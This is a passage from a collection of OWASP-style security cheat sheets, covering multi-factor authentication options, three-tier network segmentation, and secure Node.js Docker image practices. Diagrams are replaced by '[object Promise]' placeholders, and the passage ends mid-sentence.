Sheet](Authentication_Cheat_Sheet.md#implement-proper-password-strength-controls) has guidance on how to implement a strong password policy, and the [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md) has guidance on how to securely store passwords.\r\n\r\nMost multi-factor authentication systems make use of a password, as well as at least one other factor.\r\n\r\nIt should be noted that PINs, \"secret words\" and other similar type of information are all effectively the same as passwords. Using two different types of passwords **does not constitute MFA**.\r\n\r\n#### Pros\r\n\r\n- Simple and well understood.\r\n- Native support in every authentication framework.\r\n- Easy to implement.\r\n\r\n#### Cons\r\n\r\n- Users are prone to choosing weak passwords.\r\n- Passwords are commonly re-used between systems.\r\n- Susceptible to phishing.\r\n\r\n### Security Questions\r\n\r\nSecurity questions require the user to choose (or create) a number of questions that only they will know the answer to. These are effectively the same as passwords, although they are generally considered weaker. The [Choosing and Using Security Questions Cheat Sheet](Choosing_and_Using_Security_Questions_Cheat_Sheet.md) contains further guidance on how to implement these securely.\r\n\r\n#### Pros\r\n\r\n- Simple and well understood.\r\n\r\n#### Cons\r\n\r\n- Questions often have easily guessable answers.\r\n- Answers to questions can often be obtained from social media or other sources.\r\n- Questions must be carefully chosen so that users will remember answers years later.\r\n- Susceptible to phishing.\r\n\r\n## Something You Have\r\n\r\nThe second factor is something that the user possesses. This could be a physical item (such as a hardware token), a digital item (such as a certificate or private key), or based on the ownership of a mobile phone, phone number, or email address (such as SMS or a software token installed on the phone, or an email with a single-use verification code).\r\n\r\nIf properly implemented then this can be significantly more difficult for a remote attacker to compromise; however it also creates an additional administrative burden on the user, as they must keep the authentication factor with them whenever they wish to use it.\r\n\r\nThe requirement to have a second factor can also limit certain types of users' ability to access a service. For example, if a user does not have access to a mobile phone, many types of MFA will not be available for them.\r\n\r\n### Hardware OTP Tokens\r\n\r\nPhysical hardware OTP tokens can be used which generate constantly changing numeric codes, which must be submitted when authentication on the application. Most well-known of these is the [RSA SecureID](https://en.wikipedia.org/wiki/RSA_SecurID), which generates a six digit number that changes every 60 seconds.\r\n\r\n#### Pros\r\n\r\n- As the tokens are separate physical devices, they are almost impossible for an attacker to compromise remotely.\r\n- Tokens can be used without requiring the user to have a mobile phone or other device.\r\n\r\n#### Cons\r\n\r\n- Deploying physical tokens to users is expensive and complicated.\r\n- If a user loses their token it could take a significant amount of time to purchase and ship them a new one.\r\n- Some implementations require a backend server, which can introduce new vulnerabilities as well as a single point of failure.\r\n- Stolen tokens can be used without a PIN or device unlock code.\r\n- Susceptible to phishing (although short-lived).\r\n\r\n### Software TOTP Tokens\r\n\r\nA cheaper and easier alternative to hardware tokens is using software to generate Time-based One Time Password (TOTP) codes. This would typically involve the user installing a TOTP application on their mobile phone, and then scanning a QR code provided by the web application which provides the initial seed. The authenticator app then generates a six digit number every 60 seconds, in much the same way as a hardware token.\r\n\r\nMost websites use standardized TOTP tokens, allowing the user to install any authenticator app that supports TOTP. However, a small number of applications use their own variants of this (such as Symantec), which requires the users to install a specific app in order to use the service. This should be avoided in favour of a standards-based approach.\r\n\r\n#### Pros\r\n\r\n- The absence of physical tokens greatly reduces the cost and administrative overhead of implementing the system.\r\n- When users lose access to their TOTP app, a new one can be configured without needing to ship a physical token to them.\r\n- TOTP is widely used, and many users will already have at least one TOTP app installed.\r\n- As long as the user has a screen lock on their phone, an attacker will be unable to use the code if they steal the phone.\r\n\r\n#### Cons\r\n\r\n- TOTP apps are usually installed on mobile devices, which are vulnerable to compromise.\r\n- The TOTP app may be installed on the same mobile device (or workstation) that is used to authenticate.\r\n- Users may store the backup seeds insecurely.\r\n- Not all users have mobile devices to use with TOTP.\r\n- If the user's mobile device is lost, stolen or out of battery, they will be unable to authenticate.\r\n- Susceptible to phishing (although short-lived).\r\n\r\n### Hardware U2F Tokens\r\n\r\nHardware U2F tokens communicate with the users workstation over USB or NFC, and implement challenge-response based authentication, rather than requiring the user to manually enter the code. This would typically be done by the user pressing a button on the token, or tapping it against their NFC reader.\r\n\r\n#### Pros\r\n\r\n- Longer codes can be used, which may provide a higher level of security.\r\n- Users can simply press a button rather than typing in a code.\r\n- Resistant to phishing.\r\n\r\n#### Cons\r\n\r\n- As with hardware OTP tokens, the use of physical tokens introduces significant costs and administrative overheads.\r\n- Stolen tokens can be used without a PIN or device unlock code.\r\n- As the tokens are usually connected to the workstation via USB, users are more likely to forget them.\r\n\r\n### Certificates\r\n\r\nDigital certificates are files that are stored on the user's device which are automatically provided alongside the user's password when authenticating. The most common type is X.509 certificates (discussed in the [Transport Layer Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md#consider-the-use-of-client-side-certificates)), more commonly known as client certificates.\r\n\r\nCertificates are supported by all major web browsers, and once installed require no further interaction from the user. The certificates should be linked to an individual's user account in order to prevent users from trying to authenticate against other accounts.\r\n\r\n#### Pros\r\n\r\n- There is no need to purchase and manage hardware tokens.\r\n- Once installed, certificates are very simple for users.\r\n- Certificates can be centrally managed and revoked.\r\n- Resistant to phishing.\r\n\r\n#### Cons\r\n\r\n- Using digital certificates requires backend PKI system.\r\n- Installing certificates can be difficult for users, particularly in a highly restricted environment.\r\n- Enterprise proxy servers which perform SSL decryption will prevent the use of certificates.\r\n- The certificates are stored on the user's workstation, and as such can be stolen if their system is compromised.\r\n\r\n### Smartcards\r\n\r\nSmartcards are credit-card size cards with a chip containing a digital certificate for the user, which is unlocked with a PIN. They are commonly used for operating system authentication, but are rarely used in web applications.\r\n\r\n#### Pros\r\n\r\n- Stolen smartcards cannot be used without the PIN.\r\n- Smartcards can be used across multiple applications and systems.\r\n- Resistant to phishing.\r\n\r\n#### Cons\r\n\r\n- Managing and distributing smartcards has the same costs and overheads as hardware tokens.\r\n- Smartcards are not natively supported by modern browsers, so require third party software.\r\n- Although most business-class laptops have smartcard readers built in, home systems often do not.\r\n- The use of smartcards requires functioning backend PKI systems.\r\n\r\n### SMS Messages and Phone Calls\r\n\r\nSMS messages or phone calls can be used to provide users with a single-use code that they must submit as a second factor.\r\n\r\n#### Pros\r\n\r\n- Relatively simple to implement.\r\n- Requires user to link their account to a mobile number.\r\n\r\n#### Cons\r\n\r\n- Requires the user to have a mobile device or landline.\r\n- Require user to have signal to receive the call or message.\r\n- Calls and SMS messages may cost money to send (need to protect against attackers requesting a large number of messages to exhaust funds.\r\n- A number of attacks against SMS or mobile numbers have been demonstrated and exploited in the past.\r\n- SMS messages may be received on the same device the user is authenticating from.\r\n- Susceptible to phishing.\r\n\r\n### Email\r\n\r\nEmail verification requires that the user enters a code or clicks a link sent to their email address. There is some debate as to whether email constitutes a form of MFA, because if the user does not have MFA configured on their email account, it simply requires knowledge of the user's email password (which is often the same as their application password). However, it is included here for completeness.\r\n\r\n#### Pros\r\n\r\n- Very easy to implement.\r\n- No requirements for separate hardware or a mobile device.\r\n\r\n#### Cons\r\n\r\n- Relies entirely on the security of the email account, which often lacks MFA.\r\n- Email passwords are commonly the same as application passwords.\r\n- Provides no protection if the user's email is compromised first.\r\n- Email may be received by the same device the user is authenticating from.\r\n- Susceptible to phishing.\r\n\r\n## Something You Are\r\n\r\nThe final factor in the traditional view of MFA is something you are - which is one of the physical attributes of the users (often called biometrics). Biometrics has been rarely used in web pages due to the requirement for users to have specific hardware.  Most modern apps which require secure authentication have an option to use biometrics, particularly if the interfaces is already designed for a smart phone or tablet.\r\n\r\n### Biometrics\r\n\r\nThe are a number of common types of biometrics that are used, including:\r\n\r\n- Fingerprint scans\r\n- Facial recognition\r\n- Iris scans\r\n- Handprint scans\r\n\r\n#### Pros\r\n\r\n- Well-implemented biometrics are hard to spoof, and require a targeted attack.\r\n\r\n#### Cons\r\n\r\n- Require manual enrolment of the user's physical attributes.\r\n- Custom (sometimes expensive) hardware is often required to read biometrics.\r\n- Privacy concerns: Sensitive physical information must be stored about users.\r\n- If compromised, biometric data can be difficult to change.\r\n\r\n## Location\r\n\r\nThe use of location as a fourth factor for MFA is not fully accepted;  however, it is increasingly be used for authentication. It is sometimes argued that location is used when deciding whether or not to require MFA (as discussed [above](#when-to-require-mfa)) however this is effectively the same as considering it to be a factor in its own right. Two prominent examples of this are the [Conditional Access Policies](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview) available in Microsoft Azure, and the [Network Unlock](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-how-to-enable-network-unlock) functionality in BitLocker.\r\n\r\nWhen talking about location, access to the application that the user is authenticating against is not usually considered (as this would always be the case, and as such is relatively meaningless).\r\n\r\n### Source IP Ranges\r\n\r\nThe source IP address the user is connecting from can be used as a factor, typically in an allow-list based approach. This could either be based on a static list (such as corporate office ranges) or a dynamic list (such as previous IP addresses the user has authenticated from).\r\n\r\n#### Pros\r\n\r\n- Very easy for users.\r\n- Requires minimal configuration and management from administrative staff.\r\n\r\n#### Cons\r\n\r\n- Doesn't provide any protection if the user's system is compromised.\r\n- Doesn't provide any protection against rogue insiders.\r\n- Trusted IP addresses must be carefully restricted (for example, if the open guest Wi-Fi uses the main corporate IP range).\r\n\r\n### Geolocation\r\n\r\nRather than using the exact IP address of the user, the geographic location that the IP address is registered to can be used. This is less precise, but may be more feasible to implement in environments where IP addresses are not static. A common usage would be to require additional authentication factors when an authentication attempt is made from outside of the user's normal country.\r\n\r\n#### Pros\r\n\r\n- Very easy for users\r\n\r\n#### Cons\r\n\r\n- Doesn't provide any protection if the user's system is compromised.\r\n- Doesn't provide any protection against rogue insiders.\r\n- Easy for an attacker to bypass by obtaining IP addresses in the trusted country or location.\r\n"
    },
    {
      "Network_Segmentation_Cheat_Sheet.md": "# Network segmentation Cheat Sheet\r\n\r\n## Introduction\r\n\r\nNetwork segmentation is the core of multi-layer defense in depth for modern services. Segmentation slow down an attacker if he cannot implement attacks such as:\r\n\r\n- SQL-injections, see [SQL Injection Prevention Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md);\r\n- compromise of workstations of employees with elevated privileges;\r\n- compromise of another server in the perimeter of the organization;\r\n- compromise of the target service through the compromise of the LDAP directory, DNS server, and other corporate services and sites published on the Internet.\r\n\r\nThe main goal of this cheat sheet is to show the basics of network segmentation to effectively counter attacks by building a secure and maximally isolated service network architecture.\r\n\r\nSegmentation will avoid the following situations:\r\n\r\n- executing arbitrary commands on a public web server (NginX, Apache, Internet Information Service) prevents an attacker from gaining direct access to the database;\r\n- having unauthorized access to the database server, an attacker cannot access CnC on the Internet.\r\n\r\n## Content\r\n\r\n- Schematic symbols;\r\n- Three-layer network architecture;\r\n- Interservice interaction;\r\n- Network security policy;\r\n- Useful links.\r\n\r\n## Schematic symbols\r\n\r\nElements used in network diagrams:\r\n\r\n[object Promise]\r\n\r\nCrossing the border of the rectangle means crossing the firewall:\r\n[object Promise]\r\n\r\nIn the image above, traffic passes through two firewalls with the names FW1 and FW2\r\n\r\n[object Promise]\r\n\r\nIn the image above, traffic passes through one firewall, behind which there are two VLANs\r\n\r\nFurther, the schemes do not contain firewall icons so as not to overload the schemes\r\n\r\n## Three-layer network architecture\r\n\r\nBy default, developed information systems should consist of at least three components (**security zones**):\r\n\r\n1. [FRONTEND](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Network_Segmentation_Cheat_Sheet.md#FRONTEND);\r\n2. [MIDDLEWARE](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Network_Segmentation_Cheat_Sheet.md#MIDDLEWARE);\r\n3. [BACKEND](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Network_Segmentation_Cheat_Sheet.md#BACKEND).\r\n\r\n### FRONTEND\r\n\r\nFRONTEND - A frontend is a set of segments with the following network elements:\r\n\r\n- balancer;\r\n- application layer firewall;\r\n- web server;\r\n- web cache.\r\n\r\n[object Promise]\r\n\r\n### MIDDLEWARE\r\n\r\nMIDDLEWARE - a set of segments to accommodate the following network elements:\r\n\r\n- web applications that implement the logic of the information system (processing requests from clients, other services of the company and external services; execution of requests);\r\n- authorization services;\r\n- analytics services;\r\n- message queues;\r\n- stream processing platform.\r\n\r\n[object Promise]\r\n\r\n### BACKEND\r\n\r\nBACKEND - a set of network segments to accommodate the following network elements:\r\n\r\n- SQL database;\r\n- LDAP directory (Domain controller);\r\n- storage of cryptographic keys;\r\n- file server.\r\n\r\n[object Promise]\r\n\r\n### Example of Three-layer network architecture\r\n\r\n[object Promise]\r\nThe following example shows an organization's local network. The organization is called \"Сontoso\".\r\n\r\nThe edge firewall contains 2 VLANs of **FRONTEND** security zone:\r\n\r\n- _DMZ Inbound_ - a segment for hosting services and applications accessible from the Internet, they must be protected by WAF;\r\n- _DMZ Outgoing_ - a segment for hosting services that are inaccessible from the Internet, but have access to external networks (the firewall does not contain any rules for allowing traffic from external networks).\r\n\r\nThe internal firewall contains 4 VLANs:\r\n\r\n- **MIDDLEWARE** security zone contains only one VLAN with name _APPLICATIONS_ - a segment designed to host information system applications that interact with each other (interservice communication) and interact with other services;\r\n- **BACKEND** security zone contains:\r\n    - _DATABASES_ - a segment designed to delimit various databases of an automated system;\r\n    - _AD SERVICES_ - segment designed to host various Active Directory services, in the example only one server with a domain controller Contoso.com is shown;\r\n    - _LOGS_ - segment, designed to host servers with logs, servers centrally store application logs of an automated system.\r\n\r\n## Interservice interaction\r\n\r\nUsually some information systems of the company interact with each other. It is important to define a firewall policy for such interactions.\r\nThe base allowed interactions are indicated by the green arrows in the image below:\r\n[object Promise]\r\nThe image above also shows the allowed access from the FRONTEND and MIDDLEWARE segments to external networks (the Internet, for example).\r\n\r\nFrom this image follows:\r\n\r\n1. Access between FRONTEND and MIDDLEWARE segments of different information systems is prohibited;\r\n2. Access from the MIDDLEWARE segment to the BACKEND segment of another service is prohibited (access to a foreign database bypassing the application server is prohibited).\r\n\r\nForbidden accesses are indicated by red arrows in the image below:\r\n[object Promise]\r\n\r\n### Many applications on the same network\r\n\r\nIf you prefer to have fewer networks in your organization and host more applications on each network, it is acceptable to host the load balancer on those networks. This balancer will balance traffic to applications on the network.\r\nIn this case, it will be necessary to open one port to such a network, and balancing will be performed, for example, based on the HTTP request parameters.\r\nAn example of such segmentation:\r\n[object Promise]\r\n\r\nAs you can see, there is only one incoming access to each network, access is opened up to the balancer in the network. However, in this case, segmentation no longer works, access control between applications from different network segments is performed at the 7th level of the OSI model using a balancer.\r\n\r\n## Network security policy\r\n\r\nThe organization must define a \"paper\" policy that describes firewall rules and basic allowed network access.\r\nThis policy is at least useful:\r\n\r\n- network administrators;\r\n- security representatives;\r\n- IT auditors;\r\n- architects of information systems and software;\r\n- developers;\r\n- IT administrators.\r\n\r\nIt is convenient when the policy is described by similar images. The information is presented as concisely and simply as possible.\r\n\r\n### Examples of individual policy provisions\r\n\r\nExamples in the network policy will help colleagues quickly understand what access is potentially allowed and can be requested.\r\n\r\n#### Permissions for CI/CD\r\n\r\nThe network security policy may define, for example, the basic permissions allowed for the software development system. Let's look at an example of what such a policy might look like:\r\n[object Promise]\r\n\r\n#### Secure logging\r\n\r\nIt is important that in the event of a compromise of any information system, its logs are not subsequently modified by an attacker. To do this, you can do the following: copy the logs to a separate server, for example, using the syslog protocol, which does not allow an attacker to modify the logs, syslog only allows you to add new events to the logs.\r\nThe network security policy for this activity looks like this:\r\n[object Promise]\r\nIn this example, we are also talking about application logs that may contain security events, as well as potentially important events that may indicate an attack.\r\n\r\n#### Permissions for monitoring systems\r\n\r\nSuppose a company uses Zabbix as an IT monitoring system. In this case, the policy might look like this:\r\n[object Promise]\r\n\r\n## Useful links\r\n\r\n- Full network segmentation cheat sheet by [sergiomarotco](https://github.com/sergiomarotco): [link](https://github.com/sergiomarotco/Network-segmentation-cheat-sheet).\r\n"
    },
    {
      "NodeJS_Docker_Cheat_Sheet.md": "# Node.js Docker Cheat Sheet\r\n\r\nThe following cheatsheet provides production-grade guidelines for building optimized and [secure Node.js Docker](https://snyk.io/blog/10-best-practices-to-containerize-nodejs-web-applications-with-docker/). You’ll find it helpful regardless of the Node.js application you aim to build. This article will be helpful for you if:\r\n\r\n- your aim is to build a frontend application using server-side rendering (SSR) Node.js capabilities for React.\r\n- you’re looking for advice on how to properly build a Node.js Docker image for your microservices, running Fastify, NestJS or other application frameworks.\r\n\r\n## 1) Use explicit and deterministic Docker base image tags\r\n\r\nIt may seem to be an obvious choice to build your image based on the `node` Docker image, but what are you actually pulling in when you build the image? Docker images are always referenced by tags, and when you don’t specify a tag the default, `:latest` tag is used.\r\n\r\nSo, in fact, by specifying the following in your Dockerfile, you always build the latest version of the Docker image that has been built by the **Node.js Docker working group**:\r\n\r\n### FROM node\r\n\r\nThe shortcomings of building based on the default `node` image are as follows:\r\n\r\n1. Docker image builds are inconsistent. Just like we’re using `lockfiles` to get a deterministic `npm install` behavior every time we install npm packages, we’d also like to get deterministic docker image builds. If we build the image from node—which effectively means the `node:latest` tag—then every build will pull a newly built Docker image of `node`. We don’t want to introduce this sort of non-deterministic behavior.\r\n2. The node Docker image is based on a full-fledged operating system, full of libraries and tools that you may or may not need to run your Node.js web application. This has two downsides. Firstly a bigger image means a bigger download size which, besides increasing the storage requirement, means more time to download and re-build the image. Secondly, it means you’re potentially introducing security vulnerabilities, that may exist in all of these libraries and tools, into the image.\r\n\r\nIn fact, the `node` Docker image is quite big and includes hundreds of security vulnerabilities of different types and severities. If you’re using it, then by default your starting point is going to be a baseline of 642 security vulnerabilities, and hundreds of megabytes of image data that is downloaded on every pull and build.\r\n\r\nThe recommendations for building better Docker images are:\r\n\r\n1. Use small Docker images—this will translate to a smaller software footprint on the Docker image reducing the potential vulnerability vectors, and a smaller size, which will speed up the image build process\r\n2. Use the Docker image digest, which is the static SHA256 hash of the image. This ensures that you are getting deterministic Docker image builds from the base image.\r\n\r\nBased on this, let’s ensure that we use the Long Term Support (LTS) version of Node.js, and the minimal `alpine` image type to have the smallest size and software footprint on the image:\r\n\r\n### FROM node:lts-alpine\r\n\r\nNonetheless, this base image directive will still pull new builds of that tag. We can find the `SHA256` hash for it in the [Docker Hub for this Node.js tag](https://hub.docker.com/layers/node/library/node/lts-alpine/images/sha256-51e341881c2b77e52778921c685e711a186a71b8c6f62ff2edfc6b6950225a2f?context=explore), or by running the following command once we pulled this image locally, and locate the `Digest` field in the output:\r\n\r\n    $ docker pull node:lts-alpine\r\n    lts-alpine: Pulling from library/node\r\n    0a6724ff3fcd: Already exists\r\n    9383f33fa9f3: Already exists\r\n    b6ae88d676fe: Already exists\r\n    565e01e00588: Already exists\r\n    Digest: sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    Status: Downloaded newer image for node:lts-alpine\r\n    docker.io/library/node:lts-alpine\r\n\r\nAnother way to find the `SHA256` hash is by running the following command:\r\n\r\n    $ docker images --digests\r\n    REPOSITORY                     TAG              DIGEST                                                                    IMAGE ID       CREATED             SIZE\r\n    node                           lts-alpine       sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a   51d926a5599d   2 weeks ago         116MB\r\n\r\nNow we can update the Dockerfile for this Node.js Docker image as follows:\r\n\r\n    FROM node@sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    WORKDIR /usr/src/app\r\n    COPY . /usr/src/app\r\n    RUN npm install\r\n    CMD \"npm\" \"start\"\r\n\r\nHowever, the Dockerfile above, only specifies the Node.js Docker image name without an image tag which creates ambiguity for which exact image tag is being used—it’s not readable, hard to maintain and doesn’t create a good developer experience.\r\n\r\nLet’s fix it by updating the Dockerfile, providing the full base image tag for the Node.js version that corresponds to that `SHA256` hash:\r\n\r\n    FROM node:lts-alpine@sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    WORKDIR /usr/src/app\r\n    COPY . /usr/src/app\r\n    RUN npm install\r\n    CMD \"npm\" \"start\"\r\n\r\n## 2) Install only production dependencies in the Node.js Docker image\r\n\r\nThe following Dockerfile directive installs all dependencies in the container, including `devDependencies`, which aren’t needed for a functional application to work. It adds an unneeded security risk from packages used as development dependencies, as well as inflating the image size unnecessarily.\r\n\r\n**`RUN npm install`**\r\n\r\nEnforce deterministic builds with `npm ci`. This prevents surprises in a continuous integration (CI) flow because it halts if any deviations from the lockfile are made.\r\n\r\nIn the case of building a Docker image for production we want to ensure that we only install production dependencies in a deterministic way, and this brings us to the following recommendation for the best practice for installing npm dependencies in a container image:\r\n\r\n**`RUN npm ci --only=production`**\r\n\r\nThe updated Dockerfile contents in this stage are as follows:\r\n\r\n    FROM node:lts-alpine@sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    WORKDIR /usr/src/app\r\n    COPY . /usr/src/app\r\n    RUN npm ci --only=production\r\n    CMD \"npm\" \"start\"\r\n\r\n## 3) Optimize Node.js tooling for production\r\n\r\nWhen you build your Node.js Docker image for production, you want to ensure that all frameworks and libraries are using the optimal settings for performance and security.\r\n\r\nThis brings us to add the following Dockerfile directive:\r\n\r\n**`ENV NODE\\_ENV production`**\r\n\r\nAt first glance, this looks redundant, since we already specified only production dependencies in the `npm install` phase—so why is this necessary?\r\n\r\nDevelopers mostly associate the `NODE_ENV=production` environment variable setting with the installation of production-related dependencies, however, this setting also has other effects which we need to be aware of.\r\n\r\nSome frameworks and libraries may only turn on the optimized configuration that is suited to production if that `NODE_ENV` environment variable is set to `production`. Putting aside our opinion on whether this is a good or bad practice for frameworks to take, it is important to know this.\r\n\r\nAs an example, the [Express documentation](https://expressjs.com/en/advanced/best-practice-performance.html#set-node_env-to-production) outlines the importance of setting this environment variable for enabling performance and security related optimizations:\r\n\r\n[object Promise]\r\n\r\nThe performance impact of the `NODE_ENV` variable could be very significant.\r\n\r\nMany of the other libraries that you are relying on may also expect this variable to be set, so we should set this in our Dockerfile.\r\n\r\nThe updated Dockerfile should now read as follows with the `NODE_ENV` environment variable setting baked in:\r\n\r\n    FROM node:lts-alpine@sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    ENV NODE_ENV production\r\n    WORKDIR /usr/src/app\r\n    COPY . /usr/src/app\r\n    RUN npm ci --only=production\r\n    CMD \"npm\" \"start\"\r\n\r\n## 4) Don’t run containers as root\r\n\r\nThe principle of least privilege is a long-time security control from the early days of Unix and we should always follow this when we’re running our containerized Node.js web applications.\r\n\r\nThe threat assessment is pretty straight-forward—if an attacker is able to compromise the web application in a way that allows for [command injection](https://owasp.org/www-community/attacks/Command_Injection) or [directory path traversal](https://owasp.org/www-community/attacks/Path_Traversal), then these will be invoked with the user who owns the application process. If that process happens to be root then they can do virtually everything within the container, including [attempting a container escape or [privilege escalation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation). Why would we want to risk it? You’re right, we don’t.\r\n\r\nRepeat after me: **“friends don’t let friends run containers as root!”**\r\n\r\nThe official `node` Docker image, as well as its variants like `alpine`, include a least-privileged user of the same name: `node`. However, it’s not enough to just run the process as `node`. For example, the following might not be ideal for an application to function well:\r\n\r\n    USER node\r\n    CMD \"npm\" \"start\"\r\n\r\nThe reason for that is the `USER` Dockerfile directive only ensures that the process is owned by the `node` user. What about all the files we copied earlier with the `COPY` instruction? They are owned by root. That’s how Docker works by default.\r\n\r\nThe complete and proper way of dropping privileges is as follows, also showing our up to date Dockerfile practices up to this point:\r\n\r\n    FROM node:lts-alpine@sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    ENV NODE_ENV production\r\n    WORKDIR /usr/src/app\r\n    COPY --chown=node:node . /usr/src/app\r\n    RUN npm ci --only=production\r\n    USER node\r\n    CMD \"npm\" \"start\"\r\n\r\n## 5) Properly handle events to safely terminate a Node.js Docker web application\r\n\r\nOne of the most common mistakes I see with blogs and articles about containerizing Node.js applications when running in Docker containers is the way that they invoke the process. All of the following and their variants are bad patterns you should avoid:\r\n\r\n- `CMD “npm” “start”`\r\n- `CMD [“yarn”, “start”]`\r\n- `CMD “node” “server.js”`\r\n- `CMD “start-app.sh”`\r\n\r\nLet’s dig in! I’ll walk you through the differences between them and why they’re all patterns to avoid.\r\n\r\nThe following concerns are key in order to understanding the context for properly running and terminating Node.js Docker applications:\r\n\r\n1. An orchestration engine, such as Docker Swarm, Kubernetes, or even just Docker engine itself, needs a way to send signals to the process in the container. Mostly, these are signals to terminate an application, such as `SIGTERM` and `SIGKILL`.\r\n2. The process may run indirectly, and if that happens then it’s not always guaranteed that it will receive these signals.\r\n3. The Linux kernel treats processes that run as process ID 1 (PID) differently than any other process ID.\r\n\r\nEquipped with that knowledge, let’s begin investigating the ways of invoking the process for a container, starting off with the example from the Dockerfile we’re building:\r\n\r\n**`CMD \"npm\" \"start\"`**\r\n\r\nThe caveat here is two fold. Firstly, we’re indirectly running the node application by directly invoking the npm client. Who’s to say that the npm CLI forwards all events to the node runtime? It actually doesn’t, and we can easily test that.\r\n\r\nMake sure that in your Node.js application you set an event handler for the `SIGHUP` signal which logs to the console every time you’re sending an event. A simple code example should look as follows:\r\n\r\n    function handle(signal) {\r\n       console.log(`*^!@4=> Received event: ${signal}`)\r\n    }\r\n    process.on('SIGHUP', handle)\r\n\r\nThen run the container, and once it’s up specifically send it the `SIGHUP` signal using the `docker` CLI and the special `--signal` command-line flag:\r\n\r\n**`$ docker kill --signal=SIGHUP elastic\\_archimedes`**\r\n\r\nNothing happened, right? That’s because the npm client doesn’t forward any signals to the node process that it spawned.\r\n\r\nThe other caveat has to do with the different ways in which way you can specify the `CMD` directive in the Dockerfile. There are two ways, and they are not the same:\r\n\r\n1. the shellform notation, in which the container spawns a shell interpreter that wraps the process. In such cases, the shell may not properly forward signals to your process.\r\n2. the execform notation, which directly spawns a process without wrapping it in a shell. It is specified using the JSON array notation, such as: `CMD [“npm”, “start”]`. Any signals sent to the container are directly sent to the process.\r\n\r\nBased on that knowledge, we want to improve our Dockerfile process execution directive as follows:\r\n\r\n**`CMD \\[\"node\", \"server.js\"\\]`**\r\n\r\nWe are now invoking the node process directly, ensuring that it receives all of the signals sent to it, without it being wrapped in a shell interpreter.\r\n\r\nHowever, this introduces another pitfall.\r\n\r\nWhen processes run as PID 1 they effectively take on some of the responsibilities of an init system, which is typically responsible for initializing an operating system and processes. The kernel treats PID 1 in a different way than it treats other process identifiers. This special treatment from the kernel means that the handling of a `SIGTERM` signal to a running process won’t invoke a default fallback behavior of killing the process if the process doesn’t already set a handler for it.\r\n\r\nTo [quote the Node.js Docker working group recommendation](https://github.com/nodejs/docker-node/blob/master/docs/BestPractices.md#handling-kernel-signals) on this:  “Node.js was not designed to run as PID 1 which leads to unexpected behaviour when running inside of Docker. For example, a Node.js process running as PID 1 will not respond to SIGINT (CTRL-C) and similar signals”.\r\n\r\nThe way to go about it then is to use a tool that will act like an init process, in that it is invoked with PID 1, then spawns our Node.js application as another process whilst ensuring that all signals are proxied to that Node.js process. If possible, we’d like a small as possible tooling footprint for doing so to not risk having security vulnerabilities added to our container image.\r\n\r\nOne such tool is [dumb-init](https://engineeringblog.yelp.com/2016/01/dumb-init-an-init-for-docker.html) which is statically linked and has a small footprint. Here’s how we’ll set it up:\r\n\r\n    RUN apk add dumb-init\r\n    CMD [\"dumb-init\", \"node\", \"server.js\"]\r\n\r\nThis brings us to the following up to date Dockerfile. You’ll notice that we placed the `dumb-init` package install right after the image declaration, so we can take advantage of Docker’s caching of layers:\r\n\r\n    FROM node:lts-alpine@sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    RUN apk add dumb-init\r\n    ENV NODE_ENV production\r\n    WORKDIR /usr/src/app\r\n    COPY --chown=node:node . .\r\n    RUN npm ci --only=production\r\n    USER node\r\n    CMD [\"dumb-init\", \"node\", \"server.js\"]\r\n\r\nGood to know: `docker kill` and `docker stop` commands only send signals to the container process with PID 1. If you’re running a shell script that runs your Node.js application, then take note that a shell instance—such as `/bin/sh`, for example—doesn’t forward signals to child processes, which means your app will never get a `SIGTERM`.\r\n\r\n## 6) Graceful tear down for your Node.js web applications\r\n\r\nIf we’re already discussing process signals that terminate applications, let’s make sure we’re shutting them down properly and gracefully without disrupting users.\r\n\r\nWhen a Node.js application receives an interrupt signal, also known as `SIGINT`, or `CTRL+C`, it will cause an abrupt process kill, unless any event handlers were set of course to handle it in a different behavior. This means that connected clients to a web application will be immediately disconnected. Now, imagine hundreds of Node.js web containers orchestrated by Kubernetes, going up and down as needs arise to scale or manage errors. Not the greatest user experience.\r\n\r\nYou can easily simulate this problem. Here’s a stock Fastify web application example, with an inherent delayed response of 60 seconds for an endpoint:\r\n\r\n    fastify.get('/delayed', async (request, reply) => {\r\n     const SECONDS_DELAY = 60000\r\n     await new Promise(resolve => {\r\n         setTimeout(() => resolve(), SECONDS_DELAY)\r\n     })\r\n     return { hello: 'delayed world' }\r\n    })\r\n     \r\n    const start = async () => {\r\n     try {\r\n       await fastify.listen(PORT, HOST)\r\n       console.log(`*^!@4=> Process id: ${process.pid}`)\r\n     } catch (err) {\r\n       fastify.log.error(err)\r\n       process.exit(1)\r\n     }\r\n    }\r\n     \r\n    start()\r\n\r\nRun this application and once it’s running send a simple HTTP request to this endpoint:\r\n\r\n`$ time curl https://localhost:3000/delayed`\r\n\r\nHit `CTRL+C` in the running Node.js console window and you’ll see that the curl request exited abruptly. This simulates the same experience your users would receive when containers tear down.\r\n\r\nTo provide a better experience, we can do the following:\r\n\r\n1. Set an event handler for the various termination signals like `SIGINT` and `SIGTERM`.\r\n2. The handler waits for clean up operations like database connections, ongoing HTTP requests and others.\r\n3. The handler then terminates the Node.js process.\r\n\r\nSpecifically with Fastify, we can have our handler call on 